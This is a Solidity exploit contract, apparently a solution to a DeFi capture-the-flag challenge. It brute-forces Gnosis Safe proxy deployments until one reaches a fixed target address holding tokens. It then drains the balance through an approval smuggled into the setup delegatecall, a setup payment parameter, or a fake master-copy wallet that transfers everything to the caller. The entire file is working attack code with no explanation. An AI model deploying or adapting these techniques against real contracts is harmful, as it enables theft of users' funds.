// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

interface IGnosisSafeProxyFactory {
    function createProxy(
        address masterCopy,
        bytes calldata data
    ) external returns (address);
}

contract WalletDelegate {
    function approve(address token, address spender) external {
        IERC20(token).approve(spender, type(uint256).max);
    }
}

contract FakeWallet {
    function attack(address token, address attacker) external {
        IERC20(token).transfer(
            attacker,
            IERC20(token).balanceOf(address(this))
        );
    }
}

contract WalletAttacker {
    IGnosisSafeProxyFactory public constant fact =
        IGnosisSafeProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address public constant copy = 0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F;
    address public constant aim = 0x9B6fb606A9f5789444c17768c6dFCF2f83563801;
    address public immutable gem;

    constructor(address _gem) {
        gem = _gem;
    }

    function attack() public {
        address[] memory owners = new address[](1);
        owners[0] = msg.sender;
        WalletDelegate delegate = new WalletDelegate();
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners, // owners
            1, // threshold
            address(delegate), // delegate dest
            abi.encodeWithSignature(
                "approve(address,address)",
                gem,
                address(this)
            ), // delegate data
            address(0), // fallbackHandler
            address(0), // paymentToken
            0, // payment
            address(0) // paymentReceiver
        );
        console.log("Attacking");
        for (uint256 i; i < 100; ) {
            address wallet = fact.createProxy(copy, initializer);
            if (wallet == aim) {
                uint256 balance = IERC20(gem).balanceOf(wallet);
                console.log(
                    "Found aim %s at nonce %i with balance %i",
                    wallet,
                    i,
                    balance
                );
                IERC20(gem).transferFrom(wallet, msg.sender, balance);
                break;
            }
            unchecked {
                ++i;
            }
        }
    }

    function attackWithPayment() public {
        address[] memory owners = new address[](1);
        owners[0] = msg.sender;
        bytes memory initializer = abi.encodeWithSignature(
            "setup(address[],uint256,address,bytes,address,address,uint256,address)",
            owners, // owners
            1, // threshold
            address(0), // delegate dest
            "", // delegate data
            address(0), // fallbackHandler
            address(gem), // paymentToken
            20_000_000 ether, // payment
            msg.sender // paymentReceiver
        );
        console.log("Attacking");
        for (uint256 i = 1; i < 100; ) {
            address wallet;
            if (i == 43) {
                wallet = fact.createProxy(copy, initializer);
            } else {
                wallet = fact.createProxy(copy, "");
            }
            if (wallet == aim) {
                uint256 balance = IERC20(gem).balanceOf(wallet);
                console.log(
                    "Found aim %s at nonce %i with balance %i",
                    wallet,
                    i,
                    balance
                );
                break;
            }
            unchecked {
                ++i;
            }
        }
    }

    function attackWithFakeWallet() public {
        bytes memory initializer = abi.encodeWithSignature(
            "attack(address,address)",
            gem,
            msg.sender
        );
        FakeWallet master = new FakeWallet();
        for (uint256 i; i < 100; ) {
            address wallet = fact.createProxy(address(master), initializer);
            if (wallet == aim) {
                console.log("Found aim %s at nonce %i", wallet, i);
                break;
            }
            unchecked {
                ++i;
            }
        }
    }
}
